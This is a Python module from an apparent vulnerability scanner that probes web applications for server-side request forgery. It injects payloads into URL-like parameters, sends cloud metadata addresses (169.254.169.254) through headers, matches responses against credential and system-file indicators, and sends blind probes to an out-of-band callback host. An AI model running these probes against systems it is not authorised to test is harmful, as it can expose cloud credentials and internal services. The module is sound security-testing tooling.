"""
VulnScan - SSRF Scanner
Detects: Basic SSRF, Cloud metadata, Blind SSRF, Filter bypass
"""
import asyncio
import re
from typing import List
from urllib.parse import urlencode, urlparse, parse_qs
from database.models import Finding
from payloads import SSRF_PAYLOADS, COMMON_HEADERS_SSRF, COMMON_PARAMS


CLOUD_META_INDICATORS = [
    "ami-id", "instance-id", "local-ipv4", "hostname",
    "iam", "security-credentials", "computeMetadata",
    "instance/", "project/", "service-accounts",
    "ASIA", "AKIA",  # AWS key prefixes
]


class SSRFScanner:
    def __init__(self, http_client, logger=None, oast_url: str = None):
        self.http = http_client
        self.log = logger
        self.oast_url = oast_url  # Interactsh/Burp Collaborator URL
        self.findings: List[Finding] = []

    async def scan_url(self, url: str, params: dict = None) -> List[Finding]:
        if self.log:
            self.log.info(f"SSRF scan: {url}")

        parsed = urlparse(url)
        qs = parse_qs(parsed.query) if parsed.query else {}
        if params:
            qs.update(params)

        # Test URL params that look like URL-taking params
        ssrf_params = {k: v for k, v in qs.items()
                      if any(keyword in k.lower() for keyword in
                             ["url", "uri", "src", "source", "dest", "target",
                              "redirect", "callback", "proxy", "fetch", "load",
                              "link", "host", "path", "file", "page", "ref"])}

        if not ssrf_params and not qs:
            return []

        scan_params = ssrf_params if ssrf_params else qs

        tasks = []
        for param in scan_params:
            tasks.append(self._test_ssrf_param(url, param, qs.copy()))
        await asyncio.gather(*tasks)

        # Test SSRF via headers
        await self._test_ssrf_headers(url)

        return self.findings

    async def _test_ssrf_param(self, url: str, param: str, qs: dict):
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload in SSRF_PAYLOADS:
            test_qs = {k: (v[0] if isinstance(v, list) else v) for k, v in qs.items()}
            test_qs[param] = payload
            test_url = base + "?" + urlencode(test_qs)

            resp = await self.http.get(test_url)
            if not resp:
                continue

            # Check if cloud metadata returned
            for indicator in CLOUD_META_INDICATORS:
                if indicator.lower() in resp.text.lower():
                    severity = "Critical" if "iam" in resp.text.lower() or "AKIA" in resp.text else "High"
                    f = Finding(
                        vuln_type="SSRF",
                        severity=severity,
                        url=url,
                        method="GET",
                        parameter=param,
                        payload=payload,
                        evidence=f"Cloud metadata indicator found: {indicator}",
                        request=f"GET {test_url}",
                        response_snippet=resp.text[:500],
                        description=f"SSRF confirmed — cloud metadata accessible via param '{param}'",
                    )
                    self.findings.append(f)
                    if self.log:
                        self.log.vuln("SSRF", severity, url,
                                     f"Cloud metadata via param={param} payload={payload[:40]}")
                    return

            # Check for internal service responses
            if resp.status_code in (200, 301, 302) and len(resp.text) > 100:
                # Check if response contains server content (not our app)
                if any(kw in resp.text.lower() for kw in
                       ["root:x:", "win.ini", "[extensions]", "localhost",
                        "127.0.0.1", "internal", "admin", "phpinfo"]):
                    f = Finding(
                        vuln_type="SSRF",
                        severity="High",
                        url=url,
                        method="GET",
                        parameter=param,
                        payload=payload,
                        evidence=f"Internal resource response detected",
                        request=f"GET {test_url}",
                        response_snippet=resp.text[:300],
                        description=f"SSRF — internal resource fetched via param '{param}'",
                    )
                    self.findings.append(f)
                    if self.log:
                        self.log.vuln("SSRF", "High", url,
                                     f"Internal fetch via param={param}")
                    return

        # Blind SSRF via OAST
        if self.oast_url:
            await self._test_blind_ssrf(url, param, qs)

    async def _test_ssrf_headers(self, url: str):
        for header in COMMON_HEADERS_SSRF:
            for payload in ["http://169.254.169.254/", "http://localhost/"]:
                resp = await self.http.get(url, headers={header: payload})
                if resp:
                    for indicator in CLOUD_META_INDICATORS:
                        if indicator.lower() in resp.text.lower():
                            f = Finding(
                                vuln_type="SSRF",
                                severity="High",
                                url=url,
                                method="GET",
                                parameter=f"Header: {header}",
                                payload=payload,
                                evidence=f"Cloud metadata via HTTP header injection",
                                description=f"SSRF via header '{header}'",
                            )
                            self.findings.append(f)
                            if self.log:
                                self.log.vuln("SSRF", "High", url,
                                             f"Via header {header}")

    async def _test_blind_ssrf(self, url: str, param: str, qs: dict):
        """Blind SSRF via OAST server"""
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        test_qs = {k: (v[0] if isinstance(v, list) else v) for k, v in qs.items()}
        test_qs[param] = f"http://{self.oast_url}/"
        test_url = base + "?" + urlencode(test_qs)
        await self.http.get(test_url)
        # Note: Actual blind SSRF requires checking OAST server for callbacks
        if self.log:
            self.log.info(f"Blind SSRF probe sent to {self.oast_url} via param={param}")
